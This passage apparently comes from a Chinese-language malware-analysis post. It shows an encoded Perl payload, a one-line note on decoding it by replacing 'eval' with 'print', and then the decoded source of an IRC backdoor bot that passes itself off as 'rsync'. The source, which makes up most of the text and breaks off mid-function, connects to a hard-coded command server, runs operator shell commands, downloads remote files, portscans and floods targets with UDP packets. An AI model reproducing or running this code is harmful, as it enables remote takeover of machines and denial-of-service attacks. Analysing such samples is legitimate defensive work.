&quot;`@8VQO&lt;V4H1DE,12D[&quot;@H@(&quot;`@(&quot;`@(&amp;UY(&quot;1P_86-K8GET92`](&#x27;!A8VLH(DXB+&quot;`D8W5R7V)Y=&amp;4I.PH@(&quot;`@(&quot;`@(&#x27;!R:6YT(&quot;1F:&quot;`B)&#x27;!A8VMB&gt;71E(CL*_&quot;B`@(&quot;`@(&quot;`@:68@*&quot;1B&gt;71E&lt;R`]/2`D8W5R7V)Y=&amp;4I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`D9&amp;-C7W-E;&quot;T^&lt;F5M;W9E_*&quot;1F:&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@)&amp;9H+3YC;&amp;]S93L*(&quot;`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1F:&#x27;U[&lt;W1A=&#x27;5S?2`](&quot;)2_96-E8FED;R([&quot;B`@(&quot;`@(&quot;`@(&quot;`@)$1#0WLD9FA]&gt;V9T:6UE?2`](&#x27;1I;64[&quot;B`@(&quot;`@(&quot;`@(&quot;`@;F5X=#L*_(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@?2!E;&#x27;-I9B`H)&amp;1C8W1I&lt;&amp;\\@97$@(G-E;F0B*2![&quot;B`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D&lt;V5N_9&quot;`](&quot;1F:&quot;T^86-C97!T.PH@(&quot;`@(&quot;`@(&quot;`@)&#x27;-E;F0M/F%U=&amp;]F;&#x27;5S:&quot;@Q*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;1D8V-?_&lt;V5L+3YA9&amp;0H)&#x27;-E;F0I.PH@(&quot;`@(&quot;`@(&quot;`@)&amp;1C8U]S96PM/G)E;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;`@)$1#_0WLD&lt;V5N9&#x27;U[=&amp;EP;WT@/2`G&lt;V5N9&amp;-O;B&lt;[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MI=&amp;EM97T@/2!T:6UE_.PH@(&quot;`@(&quot;`@(&quot;`@)$1#0WLD&lt;V5N9&#x27;U[;FEC:WT@/2`D;FEC:SL*(&quot;`@(&quot;`@(&quot;`@(&quot;1$0T-[)&#x27;-E;F1]&gt;V)Y_=&amp;5S?2`](&quot;1B&gt;71E&lt;SL*(&quot;`@(&quot;`@(&quot;`@(&quot;1$0T-[)&#x27;-E;F1]&gt;V-U&lt;F)Y=&amp;5](#T@,#L*(&quot;`@(&quot;`@(&quot;`@(&quot;1$_0T-[)&#x27;-E;F1]&gt;V%R&lt;75I=F]](#T@)&amp;%R&lt;75I=F\\[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MI&lt;&#x27;T@/2`D&lt;V5N_9&quot;T^&lt;&amp;5E&lt;FAO&lt;W0[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MP;W)T87T@/2`D&lt;V5N9&quot;T^&lt;&amp;5E&lt;G!O&lt;G0[&quot;B`@_(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MS=&amp;%T=7-](#T@(D5N=FEA;F1O(CL*&quot;B`@(&quot;`@(&quot;`@(&quot;!O&lt;&amp;5N*$9)3$4L_(&quot;(\\(&quot;1A&lt;G%U:79O(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D9F)Y=&amp;5S.PH@(&quot;`@(&quot;`@(&quot;`@&lt;F5A9&quot;A&amp;24Q%+&quot;`D9F)Y_=&amp;5S+&quot;`Q,#(T*3L*(&quot;`@(&quot;`@(&quot;`@(&#x27;!R:6YT(&quot;1S96YD(&quot;(D9F)Y=&amp;5S(CL*(&quot;`@(&quot;`@(&quot;`@(&amp;-L;W-E($9)_3$4[&quot;B`@(&quot;`@?2!E;&#x27;-I9B`H)&amp;1C8W1I&lt;&amp;\\@97$@)W-E;F1C;VXG*2![&quot;B`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D8GET97-?_&lt;V5N9&amp;5D(#T@=6YP86-K*&quot;).(BP@)&amp;US9RD[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1F:&#x27;U[8W5R8GET97T@/2`D8GET_97-?&lt;V5N9&amp;5D.PH@(&quot;`@(&quot;`@(&quot;`@:68@*&quot;1B&gt;71E&lt;U]S96YD960@/3T@)&amp;)Y=&amp;5S*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`D9F@M/F-L;W-E.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;1C8U]S96PM/G)E;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_)$1#0WLD9FA]&gt;W-T871U&lt;WT@/2`B16YV:6%D;R([&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1F:&#x27;U[9G1I;65](#T@_=&amp;EM93L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;YE&gt;&#x27;0[&quot;B`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;!O&lt;&amp;5N*%-%3D1&amp;24Q%+&quot;`B_/&quot;`D87)Q=6EV;R(I.PH@(&quot;`@(&quot;`@(&quot;`@&lt;V5E:RA314Y$1DE,12P@)&amp;)Y=&amp;5S7W-E;F1E9&quot;P@,&quot;D[&quot;B`@(&quot;`@_(&quot;`@(&quot;!M&gt;2`D&lt;V5N9%]B&gt;71E&lt;SL*(&quot;`@(&quot;`@(&quot;`@(&#x27;)E860H4T5.1$9)3$4L(&quot;1S96YD7V)Y=&amp;5S+&quot;`Q,#(T_*3L*(&quot;`@(&quot;`@(&quot;`@(&#x27;!R:6YT(&quot;1F:&quot;`B)&#x27;-E;F1?8GET97,B.PH@(&quot;`@(&quot;`@(&quot;`@8VQO&lt;V4H4T5.1$9)3$4I_.PH@(&quot;`@(&#x27;T*(&quot;`@?0I]&quot;@H*&lt;W5B(%-%3D0@&gt;PH@(&amp;UY(&quot;@D;FEC:RP@)&amp;%R&lt;75I=F\\I(#T@0%\\[&quot;B`@=6YL_97-S(&quot;@M&lt;B`B)&amp;%R&lt;75I=F\\B*2![&quot;B`@(&quot;!R971U&lt;FXH,&quot;D[&quot;B`@?0H*(&quot;!M&gt;2`D9&amp;-C87)K(#T@)&amp;%R&lt;75I_=F\\[&quot;B`@)&amp;1C8V%R:R`]?B!S+ULN*EPO72A&lt;4RLI+R0Q+SL*&quot;B`@;7D@)&amp;UE=6EP(#T@)#HZ:7)C7W-E&lt;G9E_&lt;G-[(B0Z.DE20U]C=7)?&lt;V]C:V5T(GU[)VUE=6EP)WT[&quot;B`@;7D@)&amp;QO;F=I&lt;&quot;`](&#x27;5N&lt;&amp;%C:R@B3B(L:6YE_=%]A=&amp;]N*&quot;1M975I&lt;&quot;DI.PH*(&quot;!M&gt;2!`9FEL97-T870@/2!S=&amp;%T*&quot;1A&lt;G%U:79O*3L*(&quot;!M&gt;2`D&lt;VEZ95]T_;W1A;#TD9FEL97-T871;-UT[&quot;B`@:68@*&quot;1S:7IE7W1O=&amp;%L(#T](#`I(&#x27;L*(&quot;`@(&quot;!R971U&lt;FXH,&quot;D[&quot;B`@_?0H*(&quot;!M&gt;2`H)&#x27;!O&lt;G1A+&quot;`D&lt;V5N9&#x27;-O8VLI.PH@(&amp;1O(&#x27;L*(&quot;`@(&quot;1P;W)T82`](&amp;EN=&quot;!R86YD*#8T-3$Q_*3L*(&quot;`@(&quot;1P;W)T82`K/2`Q,#(T.PH@(&quot;`@)&#x27;-E;F1S;V-K(#T@24\\Z.E-O8VME=#HZ24Y%5&quot;T^;F5W*$QI_&lt;W1E;CT^,2P@3&amp;]C86Q0;W)T(#T^)&#x27;!O&lt;G1A+&quot;!0&lt;F]T;R`]/B`G=&amp;-P)RD@86YD(&quot;1D8V-?&lt;V5L+3YA9&amp;0H_)&#x27;-E;F1S;V-K*3L*(&quot;!](&#x27;5N=&amp;EL(&quot;1S96YD&lt;V]C:SL*&quot;B`@)$1#0WLD&lt;V5N9&#x27;-O8VM]&gt;W1I&lt;&amp;]](#T@)W-E_;F0G.PH@(&quot;1$0T-[)&#x27;-E;F1S;V-K?7MN:6-K?2`](&quot;1N:6-K.PH@(&quot;1$0T-[)&#x27;-E;F1S;V-K?7MB&gt;71E&lt;WT@_/2`D&lt;VEZ95]T;W1A;#L*(&quot;`D1$-#&gt;R1S96YD&lt;V]C:WU[87)Q=6EV;WT@/2`D87)Q=6EV;SL*&quot;@H@(&quot;8Z.F-T_8W`H(B1N:6-K(BP@(D1#0R!314Y$(&quot;1D8V-A&lt;FL@)&amp;QO;F=I&lt;&quot;`D&lt;&amp;]R=&amp;$@)&#x27;-I&gt;F5?=&amp;]T86PB*3L*&quot;GT*_&quot;G-U8B!&#x27;150@&gt;PH@(&amp;UY(&quot;@D87)Q=6EV;RP@)&amp;1C8VQO;F=I&lt;&quot;P@)&amp;1C8W!O&lt;G1A+&quot;`D8GET97,L(&quot;1N:6-K_*2`]($!?.PH@(&#x27;)E=&#x27;5R;B@P*2!I9B`H+64@(B1A&lt;G%U:79O(BD[&quot;B`@:68@*&amp;]P96XH1DE,12P@(CX@)&amp;%R_&lt;75I=F\\B*2D@&gt;PH@(&quot;`@(&amp;-L;W-E($9)3$4[&quot;B`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&#x27;)E=&#x27;5R;B@P*3L*(&quot;!]&quot;@H@(&amp;UY_(&quot;1D8V-I&lt;#UF:7AA9&amp;1R*&quot;1D8V-L;VYG:7`I.PH@(&#x27;)E=&#x27;5R;B@P*2!I9B`H)&amp;1C8W!O&lt;G1A(#P@,3`R-&quot;!O_&lt;B!N;W0@9&amp;5F:6YE9&quot;`D9&amp;-C:7`@;W(@)&amp;)Y=&amp;5S(#P@,2D[&quot;B`@;7D@)&amp;1C8W-O8VL@/2!)3SHZ4V]C:V5T_.CI)3D54+3YN97&lt;H4&#x27;)O=&amp;\\]/B)T8W`B+&quot;!0965R061D&lt;CT^)&amp;1C8VEP+&quot;!0965R4&amp;]R=#T^)&amp;1C8W!O&lt;G1A_+&quot;!4:6UE;W5T/3XQ-2D@;W(@&lt;F5T=7)N(&quot;@P*3L*(&quot;`D9&amp;-C&lt;V]C:RT^875T;V9L=7-H*#$I.PH@(&quot;1D8V-?_&lt;V5L+3YA9&amp;0H)&amp;1C8W-O8VLI.PH@(&quot;1$0T-[)&amp;1C8W-O8VM]&gt;W1I&lt;&amp;]](#T@)V=E=&quot;&lt;[&quot;B`@)$1#0WLD9&amp;-C_&lt;V]C:WU[:71I;65](#T@=&amp;EM93L*(&quot;`D1$-#&gt;R1D8V-S;V-K?7MN:6-K?2`](&quot;1N:6-K.PH@(&quot;1$0T-[)&amp;1C_8W-O8VM]&gt;V)Y=&amp;5S?2`](&quot;1B&gt;71E&lt;SL*(&quot;`D1$-#&gt;R1D8V-S;V-K?7MC=7)B&gt;71E?2`](#`[&quot;B`@)$1#0WLD_9&amp;-C&lt;V]C:WU[87)Q=6EV;WT@/2`D87)Q=6EV;SL*(&quot;`D1$-#&gt;R1D8V-S;V-K?7MI&lt;&#x27;T@/2`D9&amp;-C:7`[&quot;B`@_)$1#0WLD9&amp;-C&lt;V]C:WU[&lt;&amp;]R=&amp;%](#T@)&amp;1C8W!O&lt;G1A.PH@(&quot;1$0T-[)&amp;1C8W-O8VM]&gt;W-T871U&lt;WT@/2`B_4F5C96)E;F1O(CL*?0H*&lt;W5B(%-T871U&lt;R![&quot;B`@;7D@)&#x27;-O8VME=&quot;`](&#x27;-H:69T.PH@(&amp;UY(&quot;1S;V-K7W1I_&lt;&amp;\\@/2`D1$-#&gt;R1S;V-K971]&gt;W1I&lt;&amp;]].PH@(&#x27;5N;&amp;5S&lt;R`H;&amp;,H)&#x27;-O8VM?=&amp;EP;RD@97$@(F-H870B*2![_&quot;B`@(&quot;!M&gt;2`D;FEC:R`](&quot;1$0T-[)&#x27;-O8VME=&#x27;U[;FEC:WT[&quot;B`@(&quot;!M&gt;2`D87)Q=6EV;R`](&quot;1$0T-[)&#x27;-O_8VME=&#x27;U[87)Q=6EV;WT[&quot;B`@(&quot;!M&gt;2`D:71I;64@/2`D1$-#&gt;R1S;V-K971]&gt;VET:6UE?3L*(&quot;`@(&amp;UY(&quot;1F_=&amp;EM92`](&#x27;1I;64[&quot;B`@(&quot;!M&gt;2`D&lt;W1A=&#x27;5S(#T@)$1#0WLD&lt;V]C:V5T?7MS=&amp;%T=7-].PH@(&quot;`@)&amp;9T:6UE_(#T@)$1#0WLD&lt;V]C:V5T?7MF=&amp;EM97T@:68@9&amp;5F:6YE9&quot;@D1$-#&gt;R1S;V-K971]&gt;V9T:6UE?2D[&quot;@H@(&quot;`@_;7D@)&amp;1?=&amp;EM92`](&quot;1F=&amp;EM92TD:71I;64[&quot;@H@(&quot;`@;7D@)&amp;-U&lt;E]B&gt;71E(#T@)$1#0WLD&lt;V]C:V5T?7MC_=7)B&gt;71E?3L*(&quot;`@(&amp;UY(&quot;1B&gt;71E&lt;U]T;W1A;&quot;`](&quot;`D1$-#&gt;R1S;V-K971]&gt;V)Y=&amp;5S?3L*&quot;B`@(&quot;!M&gt;2`D_&lt;F%T92`](#`[&quot;B`@(&quot;`D&lt;F%T92`](&quot;@D8W5R7V)Y=&amp;4O,3`R-&quot;DO)&amp;1?=&amp;EM92!I9B`D8W5R7V)Y=&amp;4@/B`P_.PH@(&quot;`@;7D@)&#x27;!O&lt;F-E;B`](&quot;@D8W5R7V)Y=&amp;4J,3`P*2\\D8GET97-?=&amp;]T86P[&quot;@H@(&quot;`@;7D@*&quot;1R7V1U_=BP@)&#x27;!?9&#x27;5V*3L*(&quot;`@(&amp;EF(&quot;@D&lt;F%T92`]?B`O7BA&lt;9&quot;LI7&quot;XH7&amp;0I*%QD*2A&lt;9&quot;DO*2![&quot;B`@(&quot;`@(&quot;`D_&lt;E]D=78@/2`D,SL@)&#x27;)?9&#x27;5V*RL@:68@)#0@/CT@-3L*(&quot;`@(&quot;`@(&quot;1R871E(#T@(B0Q7&quot;XD,B(N(B1R7V1U_=B([&quot;B`@(&quot;!]&quot;B`@(&quot;!I9B`H)&#x27;!O&lt;F-E;B`]?B`O7BA&lt;9&quot;LI7&quot;XH7&amp;0I*%QD*2A&lt;9&quot;DO*2![&quot;B`@(&quot;`@(&quot;`D_&lt;%]D=78@/2`D,SL@)&#x27;!?9&#x27;5V*RL@:68@)#0@/CT@-3L*(&quot;`@(&quot;`@(&quot;1P;W)C96X@/2`B)#%&lt;+B0R(BXB)&#x27;!?_9&#x27;5V(CL*(&quot;`@(&#x27;T*(&quot;`@(&#x27;)E=&#x27;5R;B@B)&#x27;-O8VM?=&amp;EP;R(L(B1S=&amp;%T=7,B+&quot;(D;FEC:R(L(B1A&lt;G%U:79O_(BPB)&amp;)Y=&amp;5S7W1O=&amp;%L(BP@(B1C=7)?8GET92(L(B1D7W1I;64B+&quot;`B)&#x27;)A=&amp;4B+&quot;`B)&#x27;!O&lt;F-E;B(I.PH@_(&#x27;T*&quot;@H@(&#x27;)E=&#x27;5R;B@P*3L*?0H*&quot;G-U8B!F:7AA9&amp;1R(&#x27;L*(&quot;`@(&amp;UY(&quot;@D861D&lt;F5S&lt;RD@/2!`7SL*&quot;B`@_(&quot;!C:&amp;]M&lt;&quot;`D861D&lt;F5S&lt;SL@(&quot;`@(`H@(&quot;`@:68@*&quot;1A9&amp;1R97-S(#U^(&quot;]&gt;7&amp;0K)&quot;\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;!R_971U&lt;FX@:6YE=%]N=&amp;]A*&#x27;!A8VL@(DXB+&quot;`D861D&lt;F5S&lt;RD[&quot;B`@(&quot;!](&amp;5L&lt;VEF(&quot;@D861D&lt;F5S&lt;R`]?B`O_7ELQ,ET_7&amp;1[,2PR?5PN6S$R73]&lt;9&#x27;LQ+#)]7&quot;Y;,3)=/UQD&gt;S$L,GU&lt;+ELQ,ET_7&amp;1[,2PR?20O*2![&quot;B`@_(&quot;`@(&quot;`@&lt;F5T=7)N(&quot;1A9&amp;1R97-S.PH@(&quot;`@?2!E;&#x27;-I9B`H)&amp;%D9&#x27;)E&lt;W,@/7X@=&#x27;(O82UZ02U:+R\\I(&#x27;L@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(`H@(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R;B!I;F5T7VYT;V$H*&quot;AG971H;W-T8GEN86UE*&quot;1AV9&amp;1R97-S*2E;-%TI6S!=*3L*(&quot;`@(&#x27;T@96QS92![&quot;B`@(&quot;`@(&quot;`@&lt;F5T=7)N.PH@(&quot;`@?0I]&#125; 使用了 eval unpack 看起來是需要解密的東西 發現 perl 有一個函數為 unpack() 所以我們將 開頭的 eval 掉換成 print 在使用 perl 執行 1$ perl rsync 順利把程式碼解出來了my $processo = &#x27;rsync&#x27;;$servidor=&#x27;5.255.86.129&#x27; unless $servidor;my $porta=&#x27;443&#x27;;my @canais=(&quot;#007&quot;);my @adms=(&quot;A&quot;,&quot;X&quot;);my @auth=(&quot;localhost&quot;);my $linas_max=6;my $sleep=3;my $nick = getnick();my $ircname = getnick();my $realname = (`uname -a`);my $acessoshell = 1;my $prefixo = &quot;! &quot;;my $estatisticas = 0;my $pacotes = 1;my $VERSAO = &#x27;0.2a&#x27;;$SIG&#123;&#x27;INT&#x27;&#125; = &#x27;IGNORE&#x27;;$SIG&#123;&#x27;HUP&#x27;&#125; = &#x27;IGNORE&#x27;;$SIG&#123;&#x27;TERM&#x27;&#125; = &#x27;IGNORE&#x27;;$SIG&#123;&#x27;CHLD&#x27;&#125; = &#x27;IGNORE&#x27;;$SIG&#123;&#x27;PS&#x27;&#125; = &#x27;IGNORE&#x27;;use IO::Socket;use Socket;use IO::Select;chdir(&quot;/&quot;);$servidor=&quot;$ARGV[0]&quot; if $ARGV[0];$0=&quot;$processo&quot;.&quot;\\0&quot;;my $pid=fork;exit if $pid;die &quot;Problema com o fork: $!&quot; unless defined($pid);my %irc_servers;my %DCC;my $dcc_sel = new IO::Select-&gt;new();sub getnick &#123; return &quot;x&quot;.int(rand(9000));&#125;sub getident &#123; my $retornoident = &amp;_get(&quot;http://www.minpop.com/sk12pack/idents.php&quot;); my $identchance = int(rand(1000)); if ($identchance &gt; 30) &#123; return $nick; &#125; else &#123; return $retornoident; &#125; return $retornoident;&#125;sub getname &#123; my $retornoname = &amp;_get(&quot;http://www.minpop.com/sk12pack/names.php&quot;); return $retornoname;&#125;sub getident2 &#123; my $length=shift; $length = 3 if ($length &lt; 3); my @chars=(&#x27;a&#x27;..&#x27;z&#x27;,&#x27;A&#x27;..&#x27;Z&#x27;,&#x27;1&#x27;..&#x27;9&#x27;); foreach (1..$length) &#123; $randomstring.=$chars[rand @chars]; &#125; return $randomstring;&#125;sub getstore ($$)&#123; my $url = shift; my $file = shift; $http_stream_out = 1; open(GET_OUTFILE, &quot;&gt; $file&quot;); %http_loop_check = (); _get($url); close GET_OUTFILE; return $main::http_get_result;&#125;sub _get&#123; my $url = shift; my $proxy = &quot;&quot;; grep &#123;(lc($_) eq &quot;http_proxy&quot;) &amp;&amp; ($proxy = $ENV&#123;$_&#125;)&#125; keys %ENV; if (($proxy eq &quot;&quot;) &amp;&amp; $url =~ m,^http://([^/:]+)(?::(\\d+))?(/\\S*)?$,) &#123; my $host = $1; my $port = $2 || 80; my $path = $3; $path = &quot;/&quot; unless defined($path); return _trivial_http_get($host, $port, $path); &#125; elsif ($proxy =~ m,^http://([^/:]+):(\\d+)(/\\S*)?$,) &#123; my $host = $1; my $port = $2; my $path = $url; return _trivial_http_get($host, $port, $path); &#125; else &#123; return undef; &#125;&#125;sub _trivial_http_get&#123; my($host, $port, $path) = @_; my($AGENT, $VERSION, $p); $AGENT = &quot;get-minimal&quot;; $VERSION = &quot;20000118&quot;; $path =~ s/ /%20/g; require IO::Socket; local($^W) = 0; my $sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $host, PeerPort =&gt; $port, Proto =&gt; &#x27;tcp&#x27;, Timeout =&gt; 60) || return; $sock-&gt;autoflush; my $netloc = $host; $netloc .= &quot;:$port&quot; if $port != 80; my $request = &quot;GET $path HTTP/1.0\\015\\012&quot; . &quot;Host: $netloc\\015\\012&quot; . &quot;User-Agent: $AGENT/$VERSION/u\\015\\012&quot;; $request .= &quot;Pragma: no-cache\\015\\012&quot; if ($main::http_no_cache); $request .= &quot;\\015\\012&quot;; print $sock $request; my $buf = &quot;&quot;; my $n; my $b1 = &quot;&quot;; while ($n = sysread($sock, $buf, 8*1024, length($buf))) &#123; if ($b1 eq &quot;&quot;) &#123; $b1 = $buf; $buf =~ s/.+?\\015?\\012\\015?\\012//s; &#125; if ($http_stream_out) &#123; print GET_OUTFILE $buf; $buf = &quot;&quot;; &#125; &#125; return undef unless defined($n); $main::http_get_result = 200; if ($b1 =~ m,^HTTP/\\d+\\.\\d+\\s+(\\d+)[^\\012]*\\012,) &#123; $main::http_get_result = $1; if ($main::http_get_result =~ /^30[1237]/ &amp;&amp; $b1 =~ /\\012Location:\\s*(\\S+)/) &#123; my $url = $1; return undef if $http_loop_check&#123;$url&#125;++; return _get($url); &#125; return undef unless $main::http_get_result =~ /^2/; &#125; return $buf;&#125;$sel_cliente = IO::Select-&gt;new();sub sendraw &#123; if ($#_ == &#x27;1&#x27;) &#123; my $socket = $_[0]; print $socket &quot;$_[1]\\n&quot;; &#125; else &#123; print $IRC_cur_socket &quot;$_[0]\\n&quot;; &#125;&#125;sub conectar &#123; my $meunick = $_[0]; my $servidor_con = $_[1]; my $porta_con = $_[2]; my $IRC_socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$servidor_con&quot;, PeerPort=&gt;$porta_con) or return(1); if (defined($IRC_socket)) &#123; $IRC_cur_socket = $IRC_socket; $IRC_socket-&gt;autoflush(1); $sel_cliente-&gt;add($IRC_socket); $irc_servers&#123;$IRC_cur_socket&#125;&#123;&#x27;host&#x27;&#125; = &quot;$servidor_con&quot;; $irc_servers&#123;$IRC_cur_socket&#125;&#123;&#x27;porta&#x27;&#125; = &quot;$porta_con&quot;; $irc_servers&#123;$IRC_cur_socket&#125;&#123;&#x27;nick&#x27;&#125; = $meunick; $irc_servers&#123;$IRC_cur_socket&#125;&#123;&#x27;meuip&#x27;&#125; = $IRC_socket-&gt;sockhost; nick(&quot;$meunick&quot;); sendraw(&quot;USER $ircname &quot;.$IRC_socket-&gt;sockhost.&quot; $servidor_con :$realname&quot;); sleep 2; &#125;&#125;my $line_temp;while( 1 ) &#123; while (!(keys(%irc_servers))) &#123; conectar(&quot;$nick&quot;, &quot;$servidor&quot;, &quot;$porta&quot;); &#125; delete($irc_servers&#123;&#x27;&#x27;&#125;) if (defined($irc_servers&#123;&#x27;&#x27;&#125;)); &amp;DCC::connections; my @ready = $sel_cliente-&gt;can_read(0.6); next unless(@ready); foreach $fh (@ready) &#123; $IRC_cur_socket = $fh; $meunick = $irc_servers&#123;$IRC_cur_socket&#125;&#123;&#x27;nick&#x27;&#125;; $nread = sysread($fh, $msg, 4096); if ($nread == 0) &#123; $sel_cliente-&gt;remove($fh); $fh-&gt;close; delete($irc_servers&#123;$fh&#125;); &#125; @lines = split (/\\n/, $msg); for(my $c=0; $c&lt;= $#lines; $c++) &#123; $line = $lines[$c]; $line=$line_temp.$line if ($line_temp); $line_temp=&#x27;&#x27;; $line =~ s/\\r$//; unless ($c == $#lines) &#123; parse(&quot;$line&quot;); &#125; else &#123; if ($#lines == 0) &#123; parse(&quot;$line&quot;); &#125; elsif ($lines[$c] =~ /\\r$/) &#123; parse(&quot;$line&quot;); &#125; elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) &#123; parse(&quot;$line&quot;); &#125; else &#123; $line_temp = $line; &#125; &#125; &#125; &#125;&#125;sub parse &#123; my $servarg = shift; if ($servarg =~ /^PING \\:(.*)/) &#123; sendraw(&quot;PONG :$1&quot;); &#125; elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) &#123; my $pn=$1; my $onde = $4; my $args = $5; if ($args =~ /^\\001VERSION\\001$/) &#123; notice(&quot;$pn&quot;, &quot;\\001VERSION mIRC v6.16 ENE ALIN GABRIEL\\001&quot;); &#125; elsif ($args =~ /^\\001PING\\s+(\\d+)\\001$/) &#123; notice(&quot;$pn&quot;, &quot;\\001PONG\\001&quot;); &#125; elsif (grep &#123;$_ =~ /^\\Q$pn\\E$/i &#125; @adms) &#123; if ($onde eq &quot;$meunick&quot;)&#123; shell(&quot;$pn&quot;, &quot;$args&quot;); &#125; elsif ($args =~ /^(\\Q$meunick\\E|\\Q$prefixo\\E)\\s+(.*)/ ) &#123; my $natrix = $1; my $arg = $2; if ($arg =~ /^\\!(.*)/) &#123; ircase(&quot;$pn&quot;,&quot;$onde&quot;,&quot;$1&quot;) unless ($natrix eq &quot;$prefixo&quot; and $arg =~ /^\\!nick/); &#125; elsif ($arg =~ /^\\@(.*)/) &#123; $ondep = $onde; $ondep = $pn if $onde eq $meunick; bfunc(&quot;$ondep&quot;,&quot;$1&quot;); &#125; else &#123; shell(&quot;$onde&quot;, &quot;$arg&quot;); &#125; &#125; &#125; &#125; elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) &#123; if (lc($1) eq lc($meunick)) &#123; $meunick=$4; $irc_servers&#123;$IRC_cur_socket&#125;&#123;&#x27;nick&#x27;&#125; = $meunick; &#125; &#125; elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) &#123; $meunick = getnick(); nick(&quot;$meunick&quot;); &#125; elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) &#123; $meunick = $2; $irc_servers&#123;$IRC_cur_socket&#125;&#123;&#x27;nick&#x27;&#125; = $meunick; $irc_servers&#123;$IRC_cur_socket&#125;&#123;&#x27;nome&#x27;&#125; = &quot;$1&quot;; foreach my $canal (@canais) &#123; sendraw(&quot;JOIN $canal&quot;); &#125; &#125;&#125;sub bfunc &#123; my $printl = $_[0]; my $funcarg = $_[1]; if (my $pid = fork) &#123; waitpid($pid, 0); &#125; else &#123; if (fork) &#123; exit; &#125; else &#123; if ($funcarg =~ /^portscan (.*)/) &#123; my $hostip=&quot;$1&quot;; my @portas=(&quot;21&quot;,&quot;22&quot;,&quot;23&quot;,&quot;25&quot;,&quot;53&quot;,&quot;80&quot;,&quot;110&quot;,&quot;143&quot;,&quot;6665&quot;); my (@aberta, %porta_banner); foreach my $porta (@portas) &#123; my $scansock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $hostip, PeerPort =&gt; $porta, Proto =&gt; &#x27;tcp&#x27;, Timeout =&gt; 4); if ($scansock) &#123; push (@aberta, $porta); $scansock-&gt;close; &#125; &#125; if (@aberta) &#123; sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :Portas abertas: @aberta&quot;); &#125; else &#123; sendraw($IRC_cur_socket,&quot;PRIVMSG $printl :Nenhuma porta aberta foi encontrada.&quot;); &#125; &#125; elsif ($funcarg =~ /^download\\s+(.*)\\s+(.*)/) &#123; getstore(&quot;$1&quot;, &quot;$2&quot;); sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :Download de $2 ($1) Conclu.do!&quot;) if ($estatisticas); &#125; elsif ($funcarg =~ /^fullportscan\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) &#123; my $hostname=&quot;$1&quot;; my $portainicial = &quot;$2&quot;; my $portafinal = &quot;$3&quot;; my (@abertas, %porta_banner); foreach my $porta ($portainicial..$portafinal) &#123; my $scansock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $hostname, PeerPort =&gt; $porta, Proto =&gt; &#x27;tcp&#x27;, Timeout =&gt; 4); if ($scansock) &#123; push (@abertas, $porta); $scansock-&gt;close; if ($estatisticas) &#123; sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :Porta $porta aberta em $hostname&quot;); &#125; &#125; &#125; if (@abertas) &#123; sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :Portas abertas: @abertas&quot;); &#125; else &#123; sendraw($IRC_cur_socket,&quot;PRIVMSG $printl :Nenhuma porta aberta foi encontrada.&quot;); &#125; &#125; elsif ($funcarg =~ /^udp\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) &#123; return unless $pacotes; socket(Tr0x, PF_INET, SOCK_DGRAM, 17); my $alvo=inet_aton(&quot;$1&quot;); my $porta = &quot;$2&quot;; my $tempo = &quot;$3&quot;; my $pacote; my $pacotese; my $fim = time + $tempo; my $pacota = 1; while (($pacota == &quot;1&quot;) &amp;&amp; ($pacotes == &quot;1&quot;)) &#123; $pacota = 0 if ((time &gt;= $fim) &amp;&amp; ($tempo != &quot;0&quot;)); $pacote=$rand x $rand x $rand; $porta = int(rand 65000) +1 if ($porta == &quot;0&quot;); send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == &quot;1&quot;); &#125; if ($estatisticas) &#123; sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo&quot;.&quot;s&quot;); sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese&quot;); sendraw($IRC_cur_socket, &quot;PRIVMSG $printl :\\002Alvo dos Pacotes\\002: $1&quot;); &#125; &#125; elsif ($funcarg =~ /^udpfaixa\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) &#123; return unless $pacotes; 